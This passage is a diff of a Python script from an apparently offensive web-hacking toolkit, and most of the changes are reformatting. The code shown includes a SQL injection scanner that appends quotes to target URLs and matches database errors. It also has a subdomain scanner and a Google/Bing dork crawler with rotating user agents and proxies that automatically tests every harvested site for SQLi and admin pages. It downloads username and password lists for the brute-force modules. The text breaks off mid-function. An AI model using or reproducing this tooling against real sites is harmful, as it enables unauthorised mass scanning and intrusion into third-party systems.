@@ -16,22 +16,21 @@ BO = '\033[38;5;208m'
 BB = '\033[38;5;51m'
 
 # Set Variable ==========================================
-printout = W+"["+BO+"+"+W+"]"
-success = W+"["+BG+"+"+W+"]"
-fail = W+"["+BR+"-"+W+"]"
-error = W+"["+BR+"!"+W+"]"
-found = W+"["+BG+"Found!"+W+"]"
-loading = W+"["+BO+"%"+W+"]"
+printout = W + "[" + BO + "+" + W + "]"
+success = W + "[" + BG + "+" + W + "]"
+fail = W + "[" + BR + "-" + W + "]"
+error = W + "[" + BR + "!" + W + "]"
+found = W + "[" + BG + "Found!" + W + "]"
+loading = W + "[" + BO + "%" + W + "]"
 systm = W + "[" + BR + "$" + W + "]"
-loginfound = W+"["+BG+"Login Page Found!"+W+"]"
-notfound = W+"["+BR+"Page Not Found!"+W+"]"
+loginfound = W + "[" + BG + "Login Page Found!" + W + "]"
+notfound = W + "[" + BR + "Page Not Found!" + W + "]"
 ercon = W + "[" + BR + "ERROR! Could Not Connect" + W + "]"
 invalid = W + "   [" + BR + "$" + W + "]" + BR + " Invalid!"
 
-author = "SansXploit "
+author = "Surya H.S"
 git = "https://github.com/SansXpl/WebNet"
 version = "v1.0"
-#str_pswd = "Xpl99"
 line1 = "\n\n==============================["
 line2 = "]==============================\n\n"
 
@@ -41,7 +40,7 @@ whitespace = ""
 
 for xx in range(term_size.columns):
   whitespace += " "
-  
+
 whitespace = whitespace
 
 # Check Python Version ==========================================
@@ -51,12 +50,12 @@ except ImportError as sp:
   os.system("pip install platform")
 
 if sys.version[0] in '2':
-   print('\n[x] Not Supported For python 2.x Please Use Python 3.x \n')
-   ins = input('Install Python3? Y/n: ')
-   if ins == '1' or ins == '01':
-     os.system('apt install python3')
-   else:
-     exit()
+  print('\n[x] Not Supported For python 2.x Please Use Python 3.x \n')
+  ins = input('Install Python3? Y/n: ')
+  if ins == '1' or ins == '01':
+    os.system('apt install python3')
+  else:
+    exit()
 
 # Cleaning Temp ==========================================
 print(f"{systm}{BG} Cleaning Temp Folder...\n")
@@ -73,59 +72,70 @@ if os.path.exists("./.temp"):
 
 #Setup Folder & Resource =====================================
 if not os.path.exists("./output"):
-    os.makedirs("./output")
+  os.makedirs("./output")
 
 if not os.path.exists("./.temp"):
-   os.makedirs("./.temp")
+  os.makedirs("./.temp")
 
 if not os.path.exists("./src"):
-    os.makedirs("./src")
+  os.makedirs("./src")
 
 if not os.path.exists("./src/adminpages.txt"):
-    os.system("wget -O ./src/adminpages.txt https://raw.githubusercontent.com/SansXpl/src/main/adminpages.txt")
+  os.system(
+    "wget -O ./src/adminpages.txt https://raw.githubusercontent.com/SansXpl/src/main/adminpages.txt"
+  )
 
 if not os.path.exists("./src/subdomains.txt"):
-    os.system("wget -O ./src/subdomains.txt https://raw.githubusercontent.com/SansXpl/src/main/subdomains.txt")
-    
+  os.system(
+    "wget -O ./src/subdomains.txt https://raw.githubusercontent.com/SansXpl/src/main/subdomains.txt"
+  )
+
 if not os.path.exists("./src/error_sql.txt"):
-    os.system("wget -O ./src/error_sql.txt https://raw.githubusercontent.com/SansXpl/src/main/error_sql.txt")
+  os.system(
+    "wget -O ./src/error_sql.txt https://raw.githubusercontent.com/SansXpl/src/main/error_sql.txt"
+  )
 
 if not os.path.exists("./src/UserAgent.txt"):
-    os.system("wget -O ./src/UserAgent.txt https://raw.githubusercontent.com/SansXpl/src/main/UserAgent.txt")
+  os.system(
+    "wget -O ./src/UserAgent.txt https://raw.githubusercontent.com/SansXpl/src/main/UserAgent.txt"
+  )
 
 if not os.path.exists("./src/users.txt"):
-    os.system("wget -O ./src/users.txt https://raw.githubusercontent.com/SansXpl/src/main/users.txt")
+  os.system(
+    "wget -O ./src/users.txt https://raw.githubusercontent.com/SansXpl/src/main/users.txt"
+  )
 
 if not os.path.exists("./src/passwords.txt"):
-    os.system("wget -O ./src/passwords.txt https://raw.githubusercontent.com/SansXpl/src/main/passwords.txt")
+  os.system(
+    "wget -O ./src/passwords.txt https://raw.githubusercontent.com/SansXpl/src/main/passwords.txt"
+  )
 
 if not os.path.exists("./output/crawler"):
-    os.makedirs("./output/crawler")
+  os.makedirs("./output/crawler")
 
 if not os.path.exists("./output/subscan"):
-    os.makedirs("./output/subscan")
+  os.makedirs("./output/subscan")
 
 if not os.path.exists("./output/dorkscan"):
-    os.makedirs("./output/dorkscan")
-    
+  os.makedirs("./output/dorkscan")
+
 if not os.path.exists("./output/vulnsqli"):
-    os.makedirs("./output/vulnsqli")
+  os.makedirs("./output/vulnsqli")
 
 if not os.path.exists("./output/adminfind"):
-    os.makedirs("./output/adminfind")
+  os.makedirs("./output/adminfind")
 
 if not os.path.exists("./output/logbrute"):
-    os.makedirs("./output/logbrute")
+  os.makedirs("./output/logbrute")
 
 if not os.path.exists("./output/wpbrute"):
-    os.makedirs("./output/wpbrute")
+  os.makedirs("./output/wpbrute")
 
 if not os.path.exists("./output/nslookup"):
-    os.makedirs("./output/nslookup")
+  os.makedirs("./output/nslookup")
 
 if not os.path.exists("./output/revIP"):
-    os.makedirs("./output/revIP")
-
+  os.makedirs("./output/revIP")
 
 # Checking PIP Packages ==========================================
 try:
@@ -134,7 +144,7 @@ try:
   from mechanicalsoup import StatefulBrowser
   from re import findall
   from os import getcwd as pth
-  from time import sleep,localtime
+  from time import sleep, localtime
   from urllib.parse import urlparse
   from urllib.parse import urljoin
   from lxml import html
@@ -147,7 +157,7 @@ try:
   from datetime import datetime
   from blessed import Terminal
   print(f"\n{success}{BG} Packages is OK")
-    
+
 except ImportError as chk:
   print(f"\n{loading}{BO} Checking Packages ... \n")
   try:
@@ -170,21 +180,21 @@ except ImportError as chk:
   except ImportError as a2:
     print(f"{loading}{BO} Installing subprocess")
     os.system("pip install subprocess")
-  
+
   try:
     import http.client as httplib
     print(f"{success}{BG} http.client Ok")
   except ImportError as a3:
     print(f"{loading}{BO} Installing http.client")
     os.system("pip install http.client")
-  
+
   try:
     import urllib.parse
     print(f"{success}{BG} urllib.parse Ok")
   except ImportError as a4:
     print(f"{loading}{BO} Installing urllib.parse")
     os.system("pip install urllib.parse")
-  
+
   try:
     import httplib2
     print(f"{success}{BG} httplib2 Ok")
@@ -198,70 +208,70 @@ except ImportError as chk:
   except ImportError as a6:
     print(f"{loading}{BO} Installing socket")
     os.system("pip install socket")
-    
+
   try:
     import os.path
     print(f"{success}{BG} os.path Ok")
   except ImportError as a7:
     print(f"{loading}{BO} Installing os.path")
     os.system("pip install os.path")
-    
+
   try:
     import ipaddress
     print(f"{success}{BG} ipaddress Ok")
   except ImportError as a8:
     print(f"{loading}{BO} Installing ipaddress")
     os.system("pip install ipaddress")
-    
+
   try:
     import ipdetector
     print(f"{success}{BG} ipdetector Ok")
   except ImportError as a9:
     print(f"{loading}{BO} Installing ipdetector")
     os.system("pip install ipdetector")
-    
+
   try:
     import collections
     print(f"{success}{BG} collections Ok")
   except ImportError as a10:
     print(f"{loading}{BO} Installing collections")
     os.system("pip install collections")
-    
+
   try:
     import datetime
     print(f"{success}{BG} datetime Ok")
   except ImportError as a11:
     print(f"{loading}{BO} Installing datetime")
     os.system("pip install datetime")
-    
+
   try:
     import requests
     print(f"{success}{BG} requests Ok")
   except ImportError as a12:
     print(f"{loading}{BO} Installing requests")
     os.system("pip install requests")
-    
+
   try:
     import random
     print(f"{success}{BG} random Ok")
   except ImportError as a13:
     print(f"{loading}{BO} Installing random")
     os.system("pip install random")
-    
+
   try:
     import json
     print(f"{success}{BG} json Ok")
   except ImportError as a14:
     print(f"{loading}{BO} Installing json")
     os.system("pip install json")
-    
+
   try:
     import time
     print(f"{success}{BG} time Ok")
   except ImportError as a15:
     print(f"{loading}{BO} Installing time")
     os.system("pip install time")
-  
+
   try:
     import uuid
     print(f"{success}{BG} uuid Ok")
@@ -282,8 +292,8 @@ except ImportError as chk:
   except ImportError as a18:
     print(f"{loading}{BO} Installing mechanicalsoup")
     os.system("pip install mechanicalsoup")
-    
-  from time import sleep,localtime
+
+  from time import sleep, localtime
   from mechanicalsoup import StatefulBrowser
   from re import findall
   from os import getcwd as pth
@@ -299,9 +309,8 @@ except ImportError as chk:
   from datetime import datetime
   from blessed import Terminal
 
-
 # Check Device OS ==========================================
-osdevice = {'Win','Win98','WinNT3','WinNT4','Windows','WindowsCE'}
+osdevice = {'Win', 'Win98', 'WinNT3', 'WinNT4', 'Windows', 'WindowsCE'}
 
 if platform.system() in osdevice:
   clrcmd = '"cls"'
@@ -326,8 +335,9 @@ banner = f"""\033[38;5;208m
    \033[38;5;208mGithub: {git}{W}
 +──────────────────────────────────────────────+"""
 
+
 # Check Connection ==========================================
-def checkConnection(url,option):
+def checkConnection(url, option):
   sys.stdout.write(f"\n{loading}{BO} Checking Connecting to {BB}{url}")
   time.sleep(0.5)
   if option == 1:
@@ -337,7 +347,9 @@ def checkConnection(url,option):
       sys.stdout.write(f"\r{success}{BG} Connection Established!\n")
     except:
       sys.stdout.write(f"\r{whitespace}")
-      sys.stdout.write(f"\r{error}{BR} Connection Error, Maybe Your Internet Connection or Website Down!")
+      sys.stdout.write(
+        f"\r{error}{BR} Connection Error, Maybe Your Internet Connection or Website Down!"
+      )
       input("")
       main()
   elif option == 0:
@@ -347,7 +359,9 @@ def checkConnection(url,option):
       sys.stdout.write(f"\r{success}{BG} Connection Established!\n")
     except:
       sys.stdout.write(f"\r{whitespace}")
-      sys.stdout.write(f"\r{error}{BR} Connection Error, Maybe Your Internet Connection or Website Down!")
+      sys.stdout.write(
+        f"\r{error}{BR} Connection Error, Maybe Your Internet Connection or Website Down!"
+      )
       input("")
       pass
   elif option == 2:
@@ -357,21 +371,25 @@ def checkConnection(url,option):
       sys.stdout.write(f"\r{success}{BG} Connection Established!\n")
     except:
       sys.stdout.write(f"\r{whitespace}")
-      sys.stdout.write(f"\r{error}{BR} Connection Error, Maybe Your Internet Connection or Website Down!")
+      sys.stdout.write(
+        f"\r{error}{BR} Connection Error, Maybe Your Internet Connection or Website Down!"
+      )
       pass
+
 
 # Remove Duplicates Text Output ==========================================
 def removeDups(inputfile):
-    tmp = "./.temp/"
-    filename = inputfile
-    os.rename(tmp + inputfile, tmp + inputfile + "_old")
-    lines=open(tmp + inputfile + "_old", 'r').readlines()
+  tmp = "./.temp/"
+  filename = inputfile
+  os.rename(tmp + inputfile, tmp + inputfile + "_old")
+  lines = open(tmp + inputfile + "_old", 'r').readlines()
 
-    lines_set = set(lines)
-    out=open(tmp + filename, 'w')
-    for line in lines_set:
-        out.write(line)
-    os.remove(tmp + inputfile + "_old")
+  lines_set = set(lines)
+  out = open(tmp + filename, 'w')
+  for line in lines_set:
+    out.write(line)
+  os.remove(tmp + inputfile + "_old")
+
 
 # Saving File ==========================================
 def save_file(name, content, mode):
@@ -506,9 +524,10 @@ def save_file(name, content, mode):
 
 #SQli Scanner ====================================
 class sqlscan():
+
   def main(self, mode):
     try:
-      vulntemp = str(uuid.uuid4())+"_vuln"
+      vulntemp = str(uuid.uuid4()) + "_vuln"
       os.system(clrcmd)
       print(banner)
       print(f"{W}[{BR}@{W}]{BG} SQLI Scanner {W}")
@@ -516,7 +535,7 @@ class sqlscan():
         scan = str(input(f" └─[{BO}Target{W}]{P} "))
 
         n_url = urlparse(scan).hostname
-        checkConnection(scan,1)
+        checkConnection(scan, 1)
 
         try:
           try:
@@ -527,17 +546,18 @@ class sqlscan():
               sqlerror = f.read().splitlines()
 
             sys.stdout.write(f"\n{loading}{BO} Check Vuln ['][-]: {W}{scan}")
-            resp = requests.get(scan+"'")
+            resp = requests.get(scan + "'")
             errcount = 1
 
             for err in sqlerror:
               sys.stdout.write(f"\r{whitespace}")
-              sys.stdout.write(f"\r{loading}{BO} Check Vuln ['][{int(errcount)}]: {W}{scan}")
+              sys.stdout.write(
+                f"\r{loading}{BO} Check Vuln ['][{int(errcount)}]: {W}{scan}")
               errcount += 1
-              if re.search(err,resp.text):
+              if re.search(err, resp.text):
                 __vuln = err
 
-                sys.stdout.write("\r"+whitespace)
+                sys.stdout.write("\r" + whitespace)
                 sys.stdout.write(f'\n{success}{BG} Vulnerability SQLi!')
                 print(f'\n{error}{BR} Error Text: {W}{__vuln}')
                 print(f'{printout}{BB} Url: {P}{scan}\n')
@@ -552,19 +572,21 @@ Error: {err}\n\n"""
               else:
                 dq = 1
               time.sleep(0.02)
-              
+
             if dq == 1:
               sys.stdout.write(f"\r{whitespace}")
               sys.stdout.write(f'\r{loading}{BO} Check Vuln ["][-]: {W}{scan}')
-              resp1 = requests.get(scan+'"')
+              resp1 = requests.get(scan + '"')
               for errr in sqlerror:
                 sys.stdout.write(f"\r{whitespace}")
-                sys.stdout.write(f'\r{loading}{BO} Check Vuln ["][{int(errcount)}]: {W}{scan}')
+                sys.stdout.write(
+                  f'\r{loading}{BO} Check Vuln ["][{int(errcount)}]: {W}{scan}'
+                )
                 errcount += 1
-                if re.search(errr,resp.text):
+                if re.search(errr, resp.text):
                   __vuln = errr
 
-                  sys.stdout.write("\r"+whitespace)
+                  sys.stdout.write("\r" + whitespace)
                   sys.stdout.write(f'\n{success}{BG} Vulnerability SQLi!')
                   print(f'\n{error}{BR} Error Text: {W}{__vuln}')
                   print(f'{printout}{BB} Url: {P}{scan}\n')
@@ -576,16 +598,16 @@ Error: {err}\n\n"""
                   main()
                   break
                 else:
-                  sys.stdout.write(f"\r{error}{BR} Not Vulnerability: {W}{scan}")
+                  sys.stdout.write(
+                    f"\r{error}{BR} Not Vulnerability: {W}{scan}")
                   input("")
                 time.sleep(0.02)
 
           except Exception as e:
-             print(BR+e)
+            print(BR + e)
 
           except KeyboardInterrupt:
-             cancel()
-
+            cancel()
 
         except Exception:
           sys.stdout.write(f"\r{whitespace}")
@@ -608,7 +630,7 @@ Error: {err}\n\n"""
 
         for sqllist in sqllists:
           scan = sqllist
-          checkConnection(scan,2)
+          checkConnection(scan, 2)
 
           try:
             try:
@@ -619,17 +641,19 @@ Error: {err}\n\n"""
                 sqlerror = f.read().splitlines()
 
               sys.stdout.write(f"\n{loading}{BO} Check Vuln ['][-]: {W}{scan}")
-              resp = requests.get(scan+"'")
+              resp = requests.get(scan + "'")
               errcount = 1
 
               for err in sqlerror:
                 sys.stdout.write(f"\r{whitespace}")
-                sys.stdout.write(f"\r{loading}{BO} Check Vuln ['][{int(errcount)}]: {W}{scan}")
+                sys.stdout.write(
+                  f"\r{loading}{BO} Check Vuln ['][{int(errcount)}]: {W}{scan}"
+                )
                 errcount += 1
-                if re.search(err,resp.text):
+                if re.search(err, resp.text):
                   __vuln = err
 
-                  sys.stdout.write("\r"+whitespace)
+                  sys.stdout.write("\r" + whitespace)
                   sys.stdout.write(f'\n{success}{BG} Vulnerability SQLi!')
                   print(f'\n{error}{BR} Error Text: {W}{__vuln}')
                   print(f'{printout}{BB} Url: {P}{scan}\n')
@@ -646,19 +670,22 @@ Error: {err}\n\n"""
                 else:
                   dq = 1
                 time.sleep(0.02)
-              
+
               if dq == 1:
                 sys.stdout.write(f"\r{whitespace}")
-                sys.stdout.write(f'\r{loading}{BO} Check Vuln ["][-]: {W}{scan}')
-                resp1 = requests.get(scan+'"')
+                sys.stdout.write(
+                  f'\r{loading}{BO} Check Vuln ["][-]: {W}{scan}')
+                resp1 = requests.get(scan + '"')
                 for errr in sqlerror:
                   sys.stdout.write(f"\r{whitespace}")
-                  sys.stdout.write(f'\r{loading}{BO} Check Vuln ["][{int(errcount)}]: {W}{scan}')
+                  sys.stdout.write(
+                    f'\r{loading}{BO} Check Vuln ["][{int(errcount)}]: {W}{scan}'
+                  )
                   errcount += 1
-                  if re.search(errr,resp.text):
+                  if re.search(errr, resp.text):
                     __vuln = errr
 
-                    sys.stdout.write("\r"+whitespace)
+                    sys.stdout.write("\r" + whitespace)
                     sys.stdout.write(f'\n{success}{BG} Vulnerability SQLi!')
                     print(f'\n{error}{BR} Error Text: {W}{__vuln}')
                     print(f'{printout}{BB} Url: {P}{scan}\n')
@@ -672,16 +699,20 @@ Error: {err}\n\n"""
                     pass
                   else:
                     sys.stdout.write(f"\r{whitespace}")
-                    sys.stdout.write(f"\r{error}{BR} Not Vulnerability: {W}{scan}")
+                    sys.stdout.write(
+                      f"\r{error}{BR} Not Vulnerability: {W}{scan}")
                     break
                     pass
                   time.sleep(0.02)
 
             except Exception as e:
-               print(BR+e)
+              print(BR + e)
 
             except KeyboardInterrupt:
-              pause = str(input(f"\n{systm}{BB} [S = Skip] [X = Stop] {BO}Default is Skip [S/X?]"))
+              pause = str(
+                input(
+                  f"\n{systm}{BB} [S = Skip] [X = Stop] {BO}Default is Skip [S/X?]"
+                ))
 
               if pause == "X" or pause == "x":
                 if os.path.exists("./.temp/" + vulntemp):
@@ -697,7 +728,6 @@ Error: {err}\n\n"""
                   main()
               else:
                 pass
-
 
           except Exception:
             sys.stdout.write(f"\r{whitespace}")
@@ -721,7 +751,7 @@ Error: {err}\n\n"""
 #Subdomain Scanner =====================================
 class SUB():
 
-  def request(self,url):
+  def request(self, url):
     try:
       return requests.get("http://" + url)
     except requests.exceptions.ConnectionError:
@@ -734,8 +764,7 @@ class SUB():
       print(f"{W}[{BR}@{W}]{BG} Subdomain Scanner {W}")
 
       filetemp = str(uuid.uuid4())
-      s_url = str(
-        input(f" └─[{BO}Url{W}]{P} "))
+      s_url = str(input(f" └─[{BO}Url{W}]{P} "))
       if "http://" in s_url or "https://" in s_url:
         n_url = urlparse(s_url).hostname
         s_url = n_url
@@ -743,8 +772,8 @@ class SUB():
       else:
         n_url = s_url
         s_url = s_url
-        
-      checkConnection("http://"+n_url,1)
+
+      checkConnection("http://" + n_url, 1)
 
       try:
         subdomains = []
@@ -796,159 +825,117 @@ class SUB():
             main()
         main()
       except requests.exceptions.ConnectionError:
-        print("\n"+ ercon + R +
-                " " + test_url)
+        print("\n" + ercon + R + " " + test_url)
     except KeyboardInterrupt:
       cancel()
 
+
 #Dork Scanner =====================================
 
+
 def useragentdork():
-        listAgent= open("./src/UserAgent.txt", "r")
-        Agent = listAgent.read().splitlines()
-        uag = random.choice(Agent)
-        return uag
+  listAgent = open("./src/UserAgent.txt", "r")
+  Agent = listAgent.read().splitlines()
+  uag = random.choice(Agent)
+  return uag
+
 
 class scrape(StatefulBrowser):
 
-      def __repr__(
-        fitur = {
-            'features':'html.parser',
-        },
-        uag = useragentdork()
-      ):
-          return StatefulBrowser(
-            soup_config = fitur,
-            user_agent = uag
-          )
+  def __repr__(fitur={
+    'features': 'html.parser',
+  }, uag=useragentdork()):
+    return StatefulBrowser(soup_config=fitur, user_agent=uag)
+
 
 class Parser(object):
-      __list = []
-      def __init__(
-        self,
-        dork,
-        URL,
-        pattern,
-        class_tag,
-        proxy = None
-      ):
-          self.dork = dork
-          self.URL = URL
-          self.__pattern = pattern
-          self.class_tag = class_tag
-          self.proxy = {
-            'https':proxy
-          }
-          
-      def __dir__(self):
-          return list(set(self.__list))
-          
-      def get_page(self):
-          self.__req = scrape()
-          s = self.__req.open(
-            self.URL,
-            proxies = self.proxy,
-            timeout = 10
-          )
-          self.__req.select_form(
-            'form[action="/search"]'
-          )
-          self.__req['q'] = self.dork
-          self.__req.submit_selected()
-          _content = str(self.__req.get_current_page())
-          for urls in findall(
-            self.__pattern,
-            _content                        
-          ):  
-              if 'www.google.com' in self.URL: self.__list.append(urls)
-              else: self.__list.append(urls[:-1])
-          return self.__req.get_current_page().find_all(
-            'a',
-            class_=self.class_tag
-          )
-          
-      def request(self):
-          self.__req = scrape()
-          for page in self.get_page():
-              try:
-                  self.__req.open(
-                    f'{self.URL}{page.get("href")}',
-                    proxies = self.proxy
-                  )
-                  content = str(self.__req.get_current_page())
-                  for urls in findall(
-                  self.__pattern,
-                  content
-                  ):
-                      if 'www.google.com' in self.URL: self.__list.append(urls)
-                      else: self.__list.append(urls[:-1])
-              except Exception as e:
-                  input(BR+str(e))
-                  main()
+  __list = []
+
+  def __init__(self, dork, URL, pattern, class_tag, proxy=None):
+    self.dork = dork
+    self.URL = URL
+    self.__pattern = pattern
+    self.class_tag = class_tag
+    self.proxy = {'https': proxy}
+
+  def __dir__(self):
+    return list(set(self.__list))
+
+  def get_page(self):
+    self.__req = scrape()
+    s = self.__req.open(self.URL, proxies=self.proxy, timeout=10)
+    self.__req.select_form('form[action="/search"]')
+    self.__req['q'] = self.dork
+    self.__req.submit_selected()
+    _content = str(self.__req.get_current_page())
+    for urls in findall(self.__pattern, _content):
+      if 'www.google.com' in self.URL: self.__list.append(urls)
+      else: self.__list.append(urls[:-1])
+    return self.__req.get_current_page().find_all('a', class_=self.class_tag)
+
+  def request(self):
+    self.__req = scrape()
+    for page in self.get_page():
+      try:
+        self.__req.open(f'{self.URL}{page.get("href")}', proxies=self.proxy)
+        content = str(self.__req.get_current_page())
+        for urls in findall(self.__pattern, content):
+          if 'www.google.com' in self.URL: self.__list.append(urls)
+          else: self.__list.append(urls[:-1])
+      except Exception as e:
+        input(BR + str(e))
+        main()
 
 
 urls = []
 
+
 class crawl(object):
 
-      auth = {
-        1:[
-            'https://www.google.com',
-            'class="r"><a href="/url\?q=(.*?)&amp',
-            'fl'
-        ],
-        2:[
-            'https://www.bing.com',
-            'h=".*?" href="(h.*?")',
-            "b_widePag sb_bp"
-        ]
-      }
-      
-      def __init__(
-        self,
-        dork,
-        proxy = None                
-      ):  
-          self.dork = dork
-          self.proxy = proxy
+  auth = {
+    1:
+    ['https://www.google.com', 'class="r"><a href="/url\?q=(.*?)&amp', 'fl'],
+    2: ['https://www.bing.com', 'h=".*?" href="(h.*?")', "b_widePag sb_bp"]
+  }
 
-      def Bing(self):
-          bing = Parser(
-            self.dork,
-            crawl.auth[2][0],
-            crawl.auth[2][1],
-            crawl.auth[2][2],
-            proxy = self.proxy
-          )
-          bing.request()
-          for url in dir(bing):
-              if 'go.microsoft.com' in url or 'bing.com' in url:
-                  pass
-              else:
-                  urls.append(url)
-              
-      def Google(self):
-          google = Parser(
-            self.dork,
-            crawl.auth[1][0],
-            crawl.auth[1][1],
-            crawl.auth[1][2],
-            proxy = self.proxy
-          )
-          google.request()
-          for url in dir(google):
-              if 'go.microsoft.com' in url or 'bing.com' in url:
-                 pass
-              else:
-                 urls.append(url)
+  def __init__(self, dork, proxy=None):
+    self.dork = dork
+    self.proxy = proxy
+
+  def Bing(self):
+    bing = Parser(self.dork,
+                  crawl.auth[2][0],
+                  crawl.auth[2][1],
+                  crawl.auth[2][2],
+                  proxy=self.proxy)
+    bing.request()
+    for url in dir(bing):
+      if 'go.microsoft.com' in url or 'bing.com' in url:
+        pass
+      else:
+        urls.append(url)
+
+  def Google(self):
+    google = Parser(self.dork,
+                    crawl.auth[1][0],
+                    crawl.auth[1][1],
+                    crawl.auth[1][2],
+                    proxy=self.proxy)
+    google.request()
+    for url in dir(google):
+      if 'go.microsoft.com' in url or 'bing.com' in url:
+        pass
+      else:
+        urls.append(url)
 
 
 class dorkscan():
+
   def main(self):
     try:
       filetemp = str(uuid.uuid4())
       filetemp2 = str(uuid.uuid4())
-      vulntemp = str(uuid.uuid4())+"_vuln"
+      vulntemp = str(uuid.uuid4()) + "_vuln"
       os.system(clrcmd)
       print(banner)
       print(f"{W}[{BR}@{W}]{BG} Dork Scanner{W}")
@@ -956,331 +943,322 @@ class dorkscan():
       print(f"{W} │")
       dorks = str(input(f"{W} ├─[{O}Dork{W}]{P} "))
       proxy = str(input(f"{W} └─[{O}Proxy{W}]{P} "))
-      
-      prx = BR+"Not Set"
+
+      prx = BR + "Not Set"
       if "-s" in dorks or "--scan" in dorks:
         _scan = "y"
-        sqli = BG+"Scanned"
+        sqli = BG + "Scanned"
         if "--scan" in dorks:
-          _dork = dorks.replace("--scan", "" )
+          _dork = dorks.replace("--scan", "")
         else:
-          _dork = dorks.replace("-s", "" )
+          _dork = dorks.replace("-s", "")
 
       else:
         _scan = "n"
-        sqli = BR+"Not Scanned"
+        sqli = BR + "Not Scanned"
         _dork = dorks
-    
+
       if proxy.isspace() or "" in proxy:
         proxy = None
-        prx = BR+"Not Set"
+        prx = BR + "Not Set"
       else:
-        prx = BB+str(proxy)
-      
+        prx = BB + str(proxy)
+
       if not _dork.isspace() or "" in _dork:
         pass
       else:
-        input(f"{error}{BR} Input Dork!") 
+        input(f"{error}{BR} Input Dork!")
         self.main()
 
       print(f"\n{printout}{BO} Dork..: {BB}{_dork}")
       print(f"{printout}{BO} SQLi..: {sqli}")
       print(f"{printout}{BO} Proxy.: {prx}")
 
-      checkConnection("http://www.google.com/search?q="+_dork,1)
+      checkConnection("http://www.google.com/search?q=" + _dork, 1)
       sys.stdout.write(f"\n{loading}{BO} Try Getting Url...")
-      
-      nm= re.sub("[*:/<>?|=.]","_",_dork)
+
+      nm = re.sub("[*:/<>?|=.]", "_", _dork)
       mn = nm.replace("\ ", "")
       if _scan == "y":
-          if _dork != None:
-            _ = crawl(_dork,proxy=proxy)
-            _.Bing()
-            _.Google()
-            sys.stdout.write(f"\r{success}{BG} Getting Url Success!")
-            if urls != []:
-                #for url in list(set(urls)):
-                #   print('- {}'.format(url))
-                for scan in list(set(urls)):
-                      try:
-                          try:
-                              dq = 0
-                              __vuln = ""
-                              with open("./src/error_sql.txt", 'r') as f:
-                                sqlerror = f.read().splitlines()
+        if _dork != None:
+          _ = crawl(_dork, proxy=proxy)
+          _.Bing()
+          _.Google()
+          sys.stdout.write(f"\r{success}{BG} Getting Url Success!")
+          if urls != []:
+            #for url in list(set(urls)):
+            #   print('- {}'.format(url))
+            for scan in list(set(urls)):
+              try:
+                try:
+                  dq = 0
+                  __vuln = ""
+                  with open("./src/error_sql.txt", 'r') as f:
+                    sqlerror = f.read().splitlines()
 
-                              with open("./src/adminpages.txt", 'r') as r:
-                                admfound = r.read().splitlines()
+                  with open("./src/adminpages.txt", 'r') as r:
+                    admfound = r.read().splitlines()
 
-                              sys.stdout.write(f"\n{loading}{BO} Check Vuln ['][-]: {W}{scan}")
-                              resp = requests.get(scan+"'")
-                              errcount = 1
-                              for adm1 in admfound:
-                                if adm1 in scan:
-                                  admnm = urlparse(scan).hostname
-                                  print(f"\n\n{loginfound} {P}{scan}")
-                                  name = "./output/adminfind/" + admnm + ".txt"
-                                  content = "\nUrl: {}".format(scan)
-                                  save_file(name, content, 5)
-                                  print(f"{success}{BG} Login Page Saved In:{P}{name}\n\n")
-                                  break
-                                time.sleep(0.005)
+                  sys.stdout.write(
+                    f"\n{loading}{BO} Check Vuln ['][-]: {W}{scan}")
+                  resp = requests.get(scan + "'")
+                  errcount = 1
+                  for adm1 in admfound:
+                    if adm1 in scan:
+                      admnm = urlparse(scan).hostname
+                      print(f"\n\n{loginfound} {P}{scan}")
+                      name = "./output/adminfind/" + admnm + ".txt"
+                      content = "\nUrl: {}".format(scan)
+                      save_file(name, content, 5)
+                      print(f"{success}{BG} Login Page Saved In:{P}{name}\n\n")
+                      break
+                    time.sleep(0.005)
 
-                              for err in sqlerror:
-                                sys.stdout.write(f"\r{whitespace}")
-                                sys.stdout.write(f"\r{loading}{BO} Check Vuln ['][{int(errcount)}]: {W}{scan}")
-                                errcount += 1
-                                if re.search(err,resp.text):
-                                  temp = open("./.temp/" + vulntemp, "a+")
-                                  text = f"""[Checking With Single Quote (’)]
+                  for err in sqlerror:
+                    sys.stdout.write(f"\r{whitespace}")
+                    sys.stdout.write(
+                      f"\r{loading}{BO} Check Vuln ['][{int(errcount)}]: {W}{scan}"
+                    )
+                    errcount += 1
+                    if re.search(err, resp.text):
+                      temp = open("./.temp/" + vulntemp, "a+")
+                      text = f"""[Checking With Single Quote (’)]
 Url: {scan}
 Error: {err}\n\n"""
-                                  temp.writelines(text)
-                                  temp.close()
+                      temp.writelines(text)
+                      temp.close()
 
-                                  __vuln = err
+                      __vuln = err
 
-                                  sys.stdout.write("\r"+whitespace)
-                                  sys.stdout.write(f'\n{success}{BG} Vulnerability SQLi!')
-                                  print(f'\n{error}{BR} Error Text: {W}{__vuln}')
-                                  print(f'{printout}{BB} Url: {P}{scan}\n')
-                                  break
-                                  pass
-                                else:
-                                  dq = 1
-                                time.sleep(0.02)
+                      sys.stdout.write("\r" + whitespace)
+                      sys.stdout.write(f'\n{success}{BG} Vulnerability SQLi!')
+                      print(f'\n{error}{BR} Error Text: {W}{__vuln}')
+                      print(f'{printout}{BB} Url: {P}{scan}\n')
+                      break
+                      pass
+                    else:
+                      dq = 1
+                    time.sleep(0.02)
 
-
-                              if dq == 1:
-                                sys.stdout.write(f"\r{whitespace}")
-                                sys.stdout.write(f'\r{loading}{BO} Check Vuln ["][-]: {W}{scan}')
-                                resp1 = requests.get(scan+'"')
-                                errcount = 1
-                                for errr in sqlerror:
-                                  sys.stdout.write(f"\r{whitespace}")
-                                  sys.stdout.write(f'\r{loading}{BO} Check Vuln ["][{int(errcount)}]: {W}{scan}')
-                                  errcount += 1
-                                  if re.search(errr,resp1.text):
-                                    temp = open("./.temp/" + vulntemp, "a+")
-                                    text = f"""[Checking With Double Quote (”)]
+                  if dq == 1:
+                    sys.stdout.write(f"\r{whitespace}")
+                    sys.stdout.write(
+                      f'\r{loading}{BO} Check Vuln ["][-]: {W}{scan}')
+                    resp1 = requests.get(scan + '"')
+                    errcount = 1
+                    for errr in sqlerror:
+                      sys.stdout.write(f"\r{whitespace}")
+                      sys.stdout.write(
+                        f'\r{loading}{BO} Check Vuln ["][{int(errcount)}]: {W}{scan}'
+                      )
+                      errcount += 1
+                      if re.search(errr, resp1.text):
+                        temp = open("./.temp/" + vulntemp, "a+")
+                        text = f"""[Checking With Double Quote (”)]
 Url: {scan}
 Error: {err}\n\n"""
-                                    temp.writelines(text)
-                                    temp.close()
+                        temp.writelines(text)
+                        temp.close()
 
-                                    __vuln = errr
+                        __vuln = errr
 
-                                    sys.stdout.write("\r"+whitespace)
